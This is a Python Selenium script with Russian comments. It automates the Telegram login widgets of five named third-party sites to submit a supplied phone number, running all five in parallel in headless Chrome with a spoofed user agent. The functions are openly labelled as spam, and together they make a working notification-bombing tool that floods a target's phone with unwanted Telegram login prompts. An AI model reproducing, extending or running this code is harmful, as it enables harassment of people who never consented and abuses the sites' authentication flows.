import asyncio
import time
import os
import random
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains

# Глобальная переменная для файла логов
_log_file = None

def set_log_file(log_file_path):
    """Устанавливает файл для логирования"""
    global _log_file
    _log_file = log_file_path

def _write_log(level, message):
    """Внутренняя функция записи в лог"""
    if _log_file:
        try:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            log_entry = f"[{timestamp}] [{level}] {message}\n"
            with open(_log_file, "a", encoding="utf-8") as f:
                f.write(log_entry)
        except:
            pass

def log_info(message):
    _write_log("INFO", message)

def log_debug(message):
    _write_log("DEBUG", message)

def log_warning(message):
    _write_log("WARNING", message)

def log_error(message):
    _write_log("ERROR", message)

def spam_notification_botobot(phone_number, log_dir, logger, driver):
    """Функция для спама через botobot.ru"""
    try:
        log_info(f"[SPAM NOTIFICATION] Работа с botobot.ru для номера: {phone_number}")
        
        driver.get("https://botobot.ru")
        time.sleep(2)
        
        
        wait = WebDriverWait(driver, 10)
        
        # Ищем iframe с виджетом Telegram
        log_debug("[SPAM NOTIFICATION] Поиск iframe с виджетом Telegram на botobot.ru")
        try:
            telegram_iframe = wait.until(EC.presence_of_element_located((By.ID, "telegram-login-botoboto_bot")))
            log_info("[SPAM NOTIFICATION] iframe найден на botobot.ru")
            
            driver.switch_to.frame(telegram_iframe)
            log_info("[SPAM NOTIFICATION] Переключился на iframe")
            time.sleep(1)
            
            iframe_wait = WebDriverWait(driver, 5)
            login_button = None
            iframe_selectors = ["//button", "//a", "//div[@role='button']"]
            
            for selector in iframe_selectors:
                try:
                    login_button = iframe_wait.until(EC.element_to_be_clickable((By.XPATH, selector)))
                    if login_button:
                        break
                except:
                    continue
            
            if not login_button:
                all_buttons = driver.find_elements(By.TAG_NAME, "button")
                if all_buttons:
                    login_button = all_buttons[0]
            
            if not login_button:
                driver.switch_to.default_content()
                return False
            
            login_button.click()
            log_info("[SPAM NOTIFICATION] Кнопка в iframe нажата на botobot.ru")
            
            driver.switch_to.default_content()
            time.sleep(1)
            
        except Exception as e:
            log_error(f"[SPAM NOTIFICATION] Ошибка при работе с botobot.ru: {str(e)}")
            try:
                driver.switch_to.default_content()
            except:
                pass
            return False
        
        # Вводим номер телефона
        if not _enter_phone_number(phone_number, driver, log_dir, logger, "botobot.ru"):
            log_warning("[SPAM NOTIFICATION] Не удалось ввести номер телефона для botobot.ru")
            return False
        
        return True
        
    except Exception as e:
        log_error(f"[SPAM NOTIFICATION] Ошибка в spam_notification_botobot: {str(e)}")
        return False

def spam_notification_telegram_store(phone_number, log_dir, logger, driver):
    """Функция для спама через ru.telegram-store.com"""
    try:
        log_info(f"[SPAM NOTIFICATION] Работа с ru.telegram-store.com для номера: {phone_number}")
        
        driver.get("https://ru.telegram-store.com")
        log_info("[SPAM NOTIFICATION] Сайт ru.telegram-store.com открыт")
        time.sleep(2)
        

        
        wait = WebDriverWait(driver, 10)
        
        # Шаг 1: Ищем и нажимаем кнопку "Войти на сайт"
        log_debug("[SPAM NOTIFICATION] Поиск кнопки 'Войти на сайт'")
        try:
            login_site_selectors = [
                "//span[contains(text(), 'Войти на сайт')]",
                "//span[@class='header-login-link']",
                "//span[contains(@class, 'header-login-link')]",
                "//*[@class='header-login-link']",
                "//span[contains(text(), 'Войти')]",
            ]
            
            login_site_button = None
            for selector in login_site_selectors:
                try:
                    login_site_button = wait.until(EC.element_to_be_clickable((By.XPATH, selector)))
                    if login_site_button:
                        log_info(f"[SPAM NOTIFICATION] Кнопка 'Войти на сайт' найдена")
                        break
                except:
                    continue
            
            if not login_site_button:
                log_error("[SPAM NOTIFICATION] Не удалось найти кнопку 'Войти на сайт'")
                return False
            
            login_site_button.click()
            log_info("[SPAM NOTIFICATION] Кнопка 'Войти на сайт' нажата")
            time.sleep(3)
            
            # Ждем открытия модального окна
            try:
                wait.until(EC.presence_of_element_located((By.ID, "telegram_auth")))
                log_info("[SPAM NOTIFICATION] Модальное окно открыто")
            except:
                log_warning("[SPAM NOTIFICATION] Модальное окно не найдено, продолжаю")
            
            time.sleep(2)
            
        except Exception as e:
            log_error(f"[SPAM NOTIFICATION] Ошибка при поиске кнопки 'Войти на сайт': {str(e)}")
            return False
        
        # Шаг 2: Ищем iframe с виджетом Telegram в модальном окне
        log_debug("[SPAM NOTIFICATION] Поиск iframe с виджетом Telegram")
        try:
            iframe_selectors = [
                "//div[@id='telegram_auth']//iframe",
                "//iframe[contains(@src, 'oauth.telegram.org')]",
                "//iframe[contains(@src, 'telegram')]",
                "//iframe",
            ]
            
            telegram_iframe = None
            for selector in iframe_selectors:
                try:
                    telegram_iframe = wait.until(EC.presence_of_element_located((By.XPATH, selector)))
                    if telegram_iframe:
                        log_info(f"[SPAM NOTIFICATION] iframe найден")
                        break
                except:
                    continue
            
            if not telegram_iframe:
                log_error("[SPAM NOTIFICATION] Не удалось найти iframe с виджетом Telegram")
                return False
            
            driver.switch_to.frame(telegram_iframe)
            log_info("[SPAM NOTIFICATION] Переключился на iframe")
            time.sleep(1)
            
            iframe_wait = WebDriverWait(driver, 5)
            telegram_login_button = None
            iframe_selectors = ["//button", "//a", "//div[@role='button']"]
            
            for selector in iframe_selectors:
                try:
                    telegram_login_button = iframe_wait.until(EC.element_to_be_clickable((By.XPATH, selector)))
                    if telegram_login_button:
                        break
                except:
                    continue
            
            if not telegram_login_button:
                all_buttons = driver.find_elements(By.TAG_NAME, "button")
                if all_buttons:
                    telegram_login_button = all_buttons[0]
            
            if not telegram_login_button:
                driver.switch_to.default_content()
                return False
            
            telegram_login_button.click()
            log_info("[SPAM NOTIFICATION] Кнопка в iframe нажата")
            
            driver.switch_to.default_content()
            time.sleep(1)
            
        except Exception as e:
            log_error(f"[SPAM NOTIFICATION] Ошибка при работе с виджетом Telegram: {str(e)}")
            try:
                driver.switch_to.default_content()
            except:
                pass
            return False
        
        # Вводим номер телефона
        if not _enter_phone_number(phone_number, driver, log_dir, logger, "ru.telegram-store.com"):
            log_warning("[SPAM NOTIFICATION] Не удалось ввести номер телефона для ru.telegram-store.com")
            return False
        
        return True
        
    except Exception as e:
        log_error(f"[SPAM NOTIFICATION] Ошибка в spam_notification_telegram_store: {str(e)}")
        return False

def spam_notification_skidkaonline(phone_number, log_dir, logger, driver):
    """Функция для спама через account.skidkaonline.by"""
    try:
        log_info(f"[SPAM NOTIFICATION] Работа с account.skidkaonline.by для номера: {phone_number}")
        
        driver.get("https://account.skidkaonline.by/login")
        log_info("[SPAM NOTIFICATION] Сайт account.skidkaonline.by открыт")
        time.sleep(1)  # Уменьшено с 2 до 1 секунды

        
        wait = WebDriverWait(driver, 2)  # Уменьшено с 3 до 2 секунд
        
        # Ищем кнопку "Войти через Telegram"
        log_debug("[SPAM NOTIFICATION] Поиск кнопки 'Войти через Telegram' на account.skidkaonline.by")
        try:
            telegram_login_selectors = [
                "//a[contains(text(), 'Войти через Telegram')]",
                "//button[contains(text(), 'Войти через Telegram')]",
                "//a[contains(text(), 'ВОЙТИ ЧЕРЕЗ Telegram')]",
                "//button[contains(text(), 'ВОЙТИ ЧЕРЕЗ Telegram')]",
                "//a[contains(text(), 'Telegram')]",
                "//button[contains(text(), 'Telegram')]",
                "//a[contains(@href, 'telegram')]",
                "//button[contains(@href, 'telegram')]",
                "//a[contains(@class, 'telegram')]",
                "//button[contains(@class, 'telegram')]",
                "//*[contains(text(), 'Telegram') and contains(text(), 'войти')]",
                "//*[contains(text(), 'Telegram') and contains(text(), 'Войти')]",
            ]
            
            telegram_login_button = None
            # Сначала пробуем найти без ожидания (быстрее)
            for selector in telegram_login_selectors:
                try:
                    telegram_login_button = driver.find_element(By.XPATH, selector)
                    if telegram_login_button:
                        log_info(f"[SPAM NOTIFICATION] Кнопка 'Войти через Telegram' найдена с селектором: {selector}")
                        break
                except:
                    continue
            
            # Если не нашли без ожидания, пробуем с ожиданием
            if not telegram_login_button:
                for selector in telegram_login_selectors:
                    try:
                        log_debug(f"[SPAM NOTIFICATION] Пробую селектор для 'Войти через Telegram': '{selector}'")
                        telegram_login_button = wait.until(EC.element_to_be_clickable((By.XPATH, selector)))
                        if telegram_login_button:
                            log_info(f"[SPAM NOTIFICATION] Кнопка 'Войти через Telegram' найдена с селектором: {selector}")
                            break
                    except:
                        continue
            
            # Если не нашли напрямую, пробуем найти iframe
            if not telegram_login_button:
                log_debug("[SPAM NOTIFICATION] Кнопка не найдена напрямую, ищу iframe")
                try:
                    iframe_selectors = [
                        "//iframe[contains(@id, 'telegram-login')]",
                        "//iframe[contains(@src, 'oauth.telegram.org')]",
                        "//iframe[contains(@src, 'telegram')]",
                    ]
                    telegram_iframe = None
                    for selector in iframe_selectors:
                        try:
                            telegram_iframe = driver.find_element(By.XPATH, selector)
                            if telegram_iframe:
                                log_info(f"[SPAM NOTIFICATION] iframe найден с селектором: {selector}")
                                break
                        except:
                            continue
                    
                    if telegram_iframe:
                        driver.switch_to.frame(telegram_iframe)
                        log_info("[SPAM NOTIFICATION] Переключился на iframe")
                        time.sleep(0.5)
                        
                        # Ищем кнопку внутри iframe
                        try:
                            all_buttons = driver.find_elements(By.TAG_NAME, "button")
                            if all_buttons:
                                telegram_login_button = all_buttons[0]
                                log_info("[SPAM NOTIFICATION] Кнопка найдена в iframe")
                        except:
                            pass
                        
                        if not telegram_login_button:
                            iframe_wait = WebDriverWait(driver, 2)
                            iframe_selectors = ["//button", "//a", "//div[@role='button']"]
                            for selector in iframe_selectors:
                                try:
                                    telegram_login_button = iframe_wait.until(EC.element_to_be_clickable((By.XPATH, selector)))
                                    if telegram_login_button:
                                        log_info(f"[SPAM NOTIFICATION] Кнопка найдена в iframe с селектором: {selector}")
                                        break
                                except:
                                    continue
                        
                        if telegram_login_button:
                            driver.switch_to.default_content()
                            # Переключаемся обратно на iframe для клика
                            driver.switch_to.frame(telegram_iframe)
                except Exception as e:
                    log_debug(f"[SPAM NOTIFICATION] Ошибка при поиске iframe: {str(e)}")
                    try:
                        driver.switch_to.default_content()
                    except:
                        pass
            
            if not telegram_login_button:
                log_error("[SPAM NOTIFICATION] Не удалось найти кнопку 'Войти через Telegram'")
                return False
            
            log_debug("[SPAM NOTIFICATION] Нажимаю на кнопку 'Войти через Telegram'")
            telegram_login_button.click()
            log_info("[SPAM NOTIFICATION] Кнопка 'Войти через Telegram' нажата")
            
            # Возвращаемся к основному контенту, если были в iframe
            try:
                driver.switch_to.default_content()
            except:
                pass
            
            time.sleep(1)
            
        except Exception as e:
            log_error(f"[SPAM NOTIFICATION] Ошибка при поиске кнопки 'Войти через Telegram': {str(e)}")
            try:
                driver.switch_to.default_content()
            except:
                pass
            return False
        
        # Вводим номер телефона
        if not _enter_phone_number(phone_number, driver, log_dir, logger, "account.skidkaonline.by"):
            log_warning("[SPAM NOTIFICATION] Не удалось ввести номер телефона для account.skidkaonline.by")
            return False
        
        return True
        
    except Exception as e:
        log_error(f"[SPAM NOTIFICATION] Ошибка в spam_notification_skidkaonline: {str(e)}")
        return False

def spam_notification_unu(phone_number, log_dir, logger, driver):
    """Функция для спама через unu.im"""
    try:
        log_info(f"[SPAM NOTIFICATION] Работа с unu.im для номера: {phone_number}")
        
        driver.get("https://unu.im/account/regauth/telegram")
        log_info("[SPAM NOTIFICATION] Сайт unu.im открыт")
        time.sleep(2)
        
        
        # Ищем iframe с виджетом Telegram (кнопка находится внутри iframe!)
        log_debug("[SPAM NOTIFICATION] Поиск iframe с виджетом Telegram на unu.im")
        try:
            wait = WebDriverWait(driver, 3)  # Короткий таймаут
            
            # Сначала пробуем найти iframe по ID (самый быстрый способ)
            telegram_iframe = None
            try:
                telegram_iframe = wait.until(EC.presence_of_element_located((By.ID, "telegram-login-unu_work_bot")))
                log_info("[SPAM NOTIFICATION] iframe найден по ID на unu.im")
            except:
                # Если не нашли по ID, пробуем другие способы без ожидания
                try:
                    iframe_selectors = [
                        "//iframe[contains(@id, 'telegram-login')]",
                        "//iframe[contains(@src, 'oauth.telegram.org')]",
                        "//iframe[contains(@src, 'telegram')]",
                    ]
                    for selector in iframe_selectors:
                        try:
                            telegram_iframe = driver.find_element(By.XPATH, selector)
                            if telegram_iframe:
                                log_info(f"[SPAM NOTIFICATION] iframe найден с селектором: {selector}")
                                break
                        except:
                            continue
                except Exception as e:
                    log_debug(f"[SPAM NOTIFICATION] Ошибка при поиске iframe: {str(e)}")
            
            if not telegram_iframe:
                log_error("[SPAM NOTIFICATION] Не удалось найти iframe с виджетом Telegram")
                return False
            
            # Переключаемся на iframe
            driver.switch_to.frame(telegram_iframe)
            log_info("[SPAM NOTIFICATION] Переключился на iframe")
            time.sleep(0.5)  # Короткая пауза для загрузки содержимого iframe
            
            # Ищем кнопку внутри iframe с коротким таймаутом
            iframe_wait = WebDriverWait(driver, 2)
            telegram_login_button = None
            
            # Сначала пробуем найти без ожидания (быстрее)
            try:
                all_buttons = driver.find_elements(By.TAG_NAME, "button")
                if all_buttons:
                    telegram_login_button = all_buttons[0]
                    log_info("[SPAM NOTIFICATION] Кнопка найдена как первая button в iframe")
            except:
                pass
            
            # Если не нашли, пробуем с ожиданием
            if not telegram_login_button:
                iframe_selectors = ["//button", "//a", "//div[@role='button']"]
                for selector in iframe_selectors:
                    try:
                        telegram_login_button = iframe_wait.until(EC.element_to_be_clickable((By.XPATH, selector)))
                        if telegram_login_button:
                            log_info(f"[SPAM NOTIFICATION] Кнопка найдена в iframe с селектором: {selector}")
                            break
                    except:
                        continue
            
            if not telegram_login_button:
                driver.switch_to.default_content()
                log_error("[SPAM NOTIFICATION] Не удалось найти кнопку в iframe")
                return False
            
            log_debug("[SPAM NOTIFICATION] Нажимаю на кнопку в iframe")
            telegram_login_button.click()
            log_info("[SPAM NOTIFICATION] Кнопка в iframe нажата")
            
            # Возвращаемся к основному контенту
            driver.switch_to.default_content()
            time.sleep(1)
            
        except Exception as e:
            log_error(f"[SPAM NOTIFICATION] Ошибка при работе с iframe: {str(e)}")
            try:
                driver.switch_to.default_content()
            except:
                pass
            return False
        
        # Вводим номер телефона
        if not _enter_phone_number(phone_number, driver, log_dir, logger, "unu.im"):
            log_warning("[SPAM NOTIFICATION] Не удалось ввести номер телефона для unu.im")
            return False
        
        return True
        
    except Exception as e:
        log_error(f"[SPAM NOTIFICATION] Ошибка в spam_notification_unu: {str(e)}")
        return False

def spam_notification_limonad(phone_number, log_dir, logger, driver):
    """Функция для спама через app.limonad.com"""
    try:
        log_info(f"[SPAM NOTIFICATION] Работа с app.limonad.com для номера: {phone_number}")
        
        driver.get("https://app.limonad.com")
        log_info("[SPAM NOTIFICATION] Сайт app.limonad.com открыт")
        time.sleep(2)

        
        # Ищем iframe с виджетом Telegram (кнопка находится внутри iframe!)
        log_debug("[SPAM NOTIFICATION] Поиск iframe с виджетом Telegram на app.limonad.com")
        try:
            wait = WebDriverWait(driver, 3)  # Короткий таймаут
            
            # Сначала пробуем найти iframe по ID (самый быстрый способ)
            telegram_iframe = None
            try:
                telegram_iframe = wait.until(EC.presence_of_element_located((By.ID, "telegram-login-CpaLimonadBot")))
                log_info("[SPAM NOTIFICATION] iframe найден по ID на app.limonad.com")
            except:
                # Если не нашли по ID, пробуем другие способы без ожидания
                try:
                    iframe_selectors = [
                        "//iframe[contains(@id, 'telegram-login')]",
                        "//iframe[contains(@src, 'oauth.telegram.org')]",
                        "//iframe[contains(@src, 'telegram')]",
                    ]
                    for selector in iframe_selectors:
                        try:
                            telegram_iframe = driver.find_element(By.XPATH, selector)
                            if telegram_iframe:
                                log_info(f"[SPAM NOTIFICATION] iframe найден с селектором: {selector}")
                                break
                        except:
                            continue
                except Exception as e:
                    log_debug(f"[SPAM NOTIFICATION] Ошибка при поиске iframe: {str(e)}")
            
            if not telegram_iframe:
                log_error("[SPAM NOTIFICATION] Не удалось найти iframe с виджетом Telegram")
                return False
            
            # Переключаемся на iframe
            driver.switch_to.frame(telegram_iframe)
            log_info("[SPAM NOTIFICATION] Переключился на iframe")
            time.sleep(0.5)  # Короткая пауза для загрузки содержимого iframe
            
            # Ищем кнопку внутри iframe с коротким таймаутом
            iframe_wait = WebDriverWait(driver, 2)
            telegram_login_button = None
            
            # Сначала пробуем найти без ожидания (быстрее)
            try:
                all_buttons = driver.find_elements(By.TAG_NAME, "button")
                if all_buttons:
                    telegram_login_button = all_buttons[0]
                    log_info("[SPAM NOTIFICATION] Кнопка найдена как первая button в iframe")
            except:
                pass
            
            # Если не нашли, пробуем с ожиданием
            if not telegram_login_button:
                iframe_selectors = ["//button", "//a", "//div[@role='button']"]
                for selector in iframe_selectors:
                    try:
                        telegram_login_button = iframe_wait.until(EC.element_to_be_clickable((By.XPATH, selector)))
                        if telegram_login_button:
                            log_info(f"[SPAM NOTIFICATION] Кнопка найдена в iframe с селектором: {selector}")
                            break
                    except:
                        continue
            
            if not telegram_login_button:
                driver.switch_to.default_content()
                log_error("[SPAM NOTIFICATION] Не удалось найти кнопку в iframe")
                return False
            
            log_debug("[SPAM NOTIFICATION] Нажимаю на кнопку в iframe")
            telegram_login_button.click()
            log_info("[SPAM NOTIFICATION] Кнопка в iframe нажата")
            
            # Возвращаемся к основному контенту
            driver.switch_to.default_content()
            time.sleep(1)
            
        except Exception as e:
            log_error(f"[SPAM NOTIFICATION] Ошибка при работе с iframe: {str(e)}")
            try:
                driver.switch_to.default_content()
            except:
                pass
            return False
        
        # Вводим номер телефона
        if not _enter_phone_number(phone_number, driver, log_dir, logger, "app.limonad.com"):
            log_warning("[SPAM NOTIFICATION] Не удалось ввести номер телефона для app.limonad.com")
            return False
        
        return True
        
    except Exception as e:
        log_error(f"[SPAM NOTIFICATION] Ошибка в spam_notification_limonad: {str(e)}")
        return False

def _enter_phone_number(phone_number, driver, log_dir, logger, site_name):
    """Вводит номер телефона в открывшееся окно Telegram после клика на кнопку входа
    
    Args:
        phone_number: Номер телефона для ввода
        driver: WebDriver
        log_dir: Директория для логов
        logger: Логгер
        site_name: Название сайта для логирования
    
    Returns:
        True если номер успешно введен и отправлен, False в противном случае
    """
    try:
        log_debug(f"[SPAM NOTIFICATION] Ожидание открытия окна Telegram для {site_name}")
        original_window = driver.current_window_handle
        
        # Ждем открытия нового окна с таймаутом
        window_opened = False
        for _ in range(10):  # Проверяем до 10 раз (максимум 2 секунды)
            window_handles = driver.window_handles
            if len(window_handles) > 1:
                window_opened = True
                break
            time.sleep(0.2)
        
        if window_opened:
            log_info(f"[SPAM NOTIFICATION] Обнаружено новое окно для {site_name}, переключаюсь")
            # Переключаемся на последнее открытое окно
            for window in driver.window_handles:
                if window != original_window:
                    driver.switch_to.window(window)
                    break
            log_info(f"[SPAM NOTIFICATION] Переключился на новое окно, URL: {driver.current_url}")
            # Ждем загрузки страницы, но не фиксированное время
            wait = WebDriverWait(driver, 5)
            try:
                wait.until(lambda d: d.execute_script("return document.readyState") == "complete")
            except:
                pass
            time.sleep(0.5)  # Минимальная задержка для стабилизации
        else:
            log_debug(f"[SPAM NOTIFICATION] Новое окно не открылось для {site_name}, работаю в текущем окне")
            time.sleep(0.5)  # Минимальная задержка
        
        # Ищем поле для ввода номера телефона
        log_debug(f"[SPAM NOTIFICATION] Поиск поля для ввода номера телефона для {site_name}")
        wait = WebDriverWait(driver, 5)  # Уменьшен таймаут с 10 до 5 секунд
        phone_input = None
        
        phone_selectors = [
            "//input[@type='tel']",
            "//input[@type='text' and contains(@placeholder, '+')]",
            "//input[contains(@placeholder, 'phone') or contains(@placeholder, 'телефон')]",
            "//input[contains(@name, 'phone')]",
            "//input[@id='phone']",
            "//input[contains(@class, 'phone')]",
            "//input[@type='text']",
        ]
        
        # Пробуем найти поле ввода
        for selector in phone_selectors:
            try:
                log_debug(f"[SPAM NOTIFICATION] Пробую селектор для поля ввода: '{selector}'")
                phone_input = wait.until(EC.presence_of_element_located((By.XPATH, selector)))
                if phone_input:
                    # Проверяем, что это действительно поле для телефона
                    placeholder = phone_input.get_attribute('placeholder') or ''
                    name = phone_input.get_attribute('name') or ''
                    input_type = phone_input.get_attribute('type') or ''
                    if 'phone' in placeholder.lower() or 'телефон' in placeholder.lower() or 'phone' in name.lower() or input_type == 'tel' or '+' in placeholder:
                        log_info(f"[SPAM NOTIFICATION] Поле для ввода найдено с селектором: {selector}")
                        break
                    else:
                        phone_input = None
            except:
                continue
        
        # Если не нашли по селекторам, пробуем найти все input поля
        if not phone_input:
            try:
                all_inputs = driver.find_elements(By.TAG_NAME, "input")
                log_debug(f"[SPAM NOTIFICATION] Найдено input полей: {len(all_inputs)}")
                for inp in all_inputs:
                    try:
                        inp_type = inp.get_attribute('type') or ''
                        inp_name = inp.get_attribute('name') or ''
                        inp_placeholder = inp.get_attribute('placeholder') or ''
                        inp_id = inp.get_attribute('id') or ''
                        if 'phone' in inp_name.lower() or 'phone' in inp_placeholder.lower() or 'телефон' in inp_placeholder.lower() or inp_type == 'tel' or '+' in inp_placeholder:
                            phone_input = inp
                            log_info(f"[SPAM NOTIFICATION] Поле для ввода найдено по атрибутам")
                            break
                    except:
                        pass
            except Exception as e:
                log_debug(f"[SPAM NOTIFICATION] Ошибка при поиске input полей: {str(e)}")
        
        if not phone_input:
            return False
        
        # Вводим номер телефона
        log_debug(f"[SPAM NOTIFICATION] Ввод номера телефона: {phone_number} для {site_name}")
        phone_input.clear()
        phone_input.send_keys(phone_number)
        log_info(f"[SPAM NOTIFICATION] Номер телефона введен: {phone_number}")
        time.sleep(1)  # Задержка для обработки ввода и валидации формы
        
        # Ищем и нажимаем кнопку отправки
        log_debug(f"[SPAM NOTIFICATION] Поиск кнопки отправки для {site_name}")
        submit_clicked = False
        submit_selectors = [
            "//button[@type='submit']",
            "//button[contains(text(), 'Отправить')]",
            "//button[contains(text(), 'Send')]",
            "//button[contains(text(), 'Далее')]",
            "//button[contains(text(), 'Next')]",
            "//button[contains(text(), 'Continue')]",
            "//button[contains(text(), 'Продолжить')]",
            "//input[@type='submit']",
            "//button",
        ]
        
        for selector in submit_selectors:
            try:
                submit_button = driver.find_element(By.XPATH, selector)
                if submit_button and submit_button.is_displayed():
                    log_info(f"[SPAM NOTIFICATION] Кнопка отправки найдена: {selector}")
                    # Пробуем обычный клик
                    try:
                        submit_button.click()
                        log_info(f"[SPAM NOTIFICATION] Обычный клик выполнен для {site_name}")
                    except:
                        # Если обычный клик не сработал, пробуем JavaScript клик
                        try:
                            driver.execute_script("arguments[0].click();", submit_button)
                            log_info(f"[SPAM NOTIFICATION] JavaScript клик выполнен для {site_name}")
                        except Exception as js_error:
                            log_warning(f"[SPAM NOTIFICATION] JavaScript клик не сработал: {str(js_error)}")
                            # Пробуем через ActionChains
                            try:
                                ActionChains(driver).move_to_element(submit_button).click().perform()
                                log_info(f"[SPAM NOTIFICATION] ActionChains клик выполнен для {site_name}")
                            except:
                                pass
                    
                    log_info(f"[SPAM NOTIFICATION] Кнопка отправки нажата для {site_name}")
                    submit_clicked = True
                    break
            except:
                continue
        
        # Если не нашли кнопку, пробуем нажать Enter
        if not submit_clicked:
            try:
                phone_input.send_keys(Keys.RETURN)
                log_info(f"[SPAM NOTIFICATION] Нажал Enter на поле ввода для {site_name}")
                submit_clicked = True
            except Exception as e:
                log_debug(f"[SPAM NOTIFICATION] Не удалось нажать Enter: {str(e)}")
        
        # Важно: даем время на отправку формы и обработку запроса Telegram
        log_debug(f"[SPAM NOTIFICATION] Ожидание обработки отправки формы для {site_name}")
        
        # Для unu.im может потребоваться больше времени
        wait_time = 4 if "unu.im" in site_name else 3
        time.sleep(wait_time)
        
        # Дополнительно проверяем, что форма отправилась (для unu.im)
        if "unu.im" in site_name:
            try:
                # Ждем изменения URL или появления сообщения об успехе/ошибке
                current_url = driver.current_url
                time.sleep(1)  # Дополнительная задержка для unu.im
                log_debug(f"[SPAM NOTIFICATION] URL после отправки для unu.im: {driver.current_url}")
            except:
                pass
        
        # Закрываем новое окно, если оно было открыто
        current_window_handles = driver.window_handles
        if len(current_window_handles) > 1:
            try:
                driver.close()
                driver.switch_to.window(original_window)
                log_debug(f"[SPAM NOTIFICATION] Закрыл новое окно для {site_name}")
            except:
                pass
        
        return True
        
    except Exception as e:
        log_error(f"[SPAM NOTIFICATION] Ошибка при вводе номера телефона для {site_name}: {str(e)}")
        # Пытаемся вернуться к исходному окну
        try:
            if 'original_window' in locals() and len(driver.window_handles) > 1:
                driver.switch_to.window(original_window)
        except:
            pass
        return False

def _create_driver():
    """Создает и возвращает настроенный Chrome WebDriver"""
    chrome_options = Options()
    chrome_options.add_argument('--headless')
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--disable-dev-shm-usage')
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_argument('--window-size=1920,1080')
    chrome_options.add_argument('user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
    return webdriver.Chrome(options=chrome_options)

def _run_spam_function(func, site_name, phone_number, log_dir, logger=None):
    """Вспомогательная функция для запуска одной функции спама в отдельном потоке"""
    driver = None
    try:
        log_info(f"[SPAM NOTIFICATION] Запуск {site_name} для номера: {phone_number}")
        driver = _create_driver()
        result = func(phone_number, log_dir, logger, driver)
        if result:
            log_info(f"[SPAM NOTIFICATION] {site_name} успешно выполнен")
        else:
            log_warning(f"[SPAM NOTIFICATION] {site_name} завершился с ошибкой")
        return result
    except Exception as e:
        log_error(f"[SPAM NOTIFICATION] Ошибка в {site_name}: {str(e)}")
        return False
    finally:
        if driver:
            try:
                driver.quit()
            except Exception as e:
                log_error(f"[SPAM NOTIFICATION] Ошибка при закрытии WebDriver для {site_name}: {str(e)}")

def spam_notification_sync(phone_number, log_dir, logger=None):
    try:
        log_info(f"[SPAM NOTIFICATION] Начало работы для номера: {phone_number}")
        
        # Список всех функций спама с их названиями
        spam_functions = [
            (spam_notification_botobot, "botobot.ru"),
            (spam_notification_telegram_store, "ru.telegram-store.com"),
            (spam_notification_skidkaonline, "account.skidkaonline.by"),
            (spam_notification_unu, "unu.im"),
            (spam_notification_limonad, "app.limonad.com"),
        ]
        
        # Запускаем все функции параллельно
        results = {}
        with ThreadPoolExecutor(max_workers=len(spam_functions)) as executor:
            # Запускаем все задачи
            future_to_site = {
                executor.submit(_run_spam_function, func, site_name, phone_number, log_dir, logger): site_name
                for func, site_name in spam_functions
            }
            
            # Собираем результаты
            for future in as_completed(future_to_site):
                site_name = future_to_site[future]
                try:
                    result = future.result()
                    results[site_name] = result
                except Exception as e:
                    log_error(f"[SPAM NOTIFICATION] Исключение при выполнении {site_name}: {str(e)}")
                    results[site_name] = False
        
        # Подсчитываем успешные и неудачные запросы
        successful = sum(1 for r in results.values() if r)
        failed = len(results) - successful
        
        log_info(f"[SPAM NOTIFICATION] Завершено: успешно {successful}/{len(results)}, ошибок {failed}")
        
        # Возвращаем True если хотя бы один сайт успешно отработал
        return successful > 0
            
    except Exception as e:
        log_error(f"[SPAM NOTIFICATION] Ошибка при спаме уведомлений: {str(e)}")
        return False

async def spam_notification(phone_number, executor, log_dir, logger):
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(executor, spam_notification_sync, phone_number, log_dir, logger)


